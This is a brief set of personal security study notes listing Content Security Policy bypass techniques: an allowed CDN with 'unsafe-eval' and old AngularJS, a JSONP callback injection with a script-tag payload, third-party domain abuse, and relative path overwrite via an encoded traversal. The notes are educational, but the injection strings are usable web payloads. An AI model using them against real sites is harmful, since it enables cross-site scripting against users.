Daily Notes : Day 87 
Content Security Policy Bypasses  - Part 2

1. Third Party Endpoints + ('unsafe-eval')
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval'; 
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>

2. Third Party Endpoints + JSONP
Content-Security-Policy: script-src 'self' https://google.com https://youtube.com; object-src 'none';
"><script src="https://google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>

3. Third Party Abuses
Content-Security-Policy​: default-src 'self’ http://facebook.com;​
Content-Security-Policy​: connect-src http://facebook.com;​

4. Bypass via RPO (Relative Path Overwrite)
For example, if CSP allows the path https://example.com/scripts/react/, it can be bypassed as follows:
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>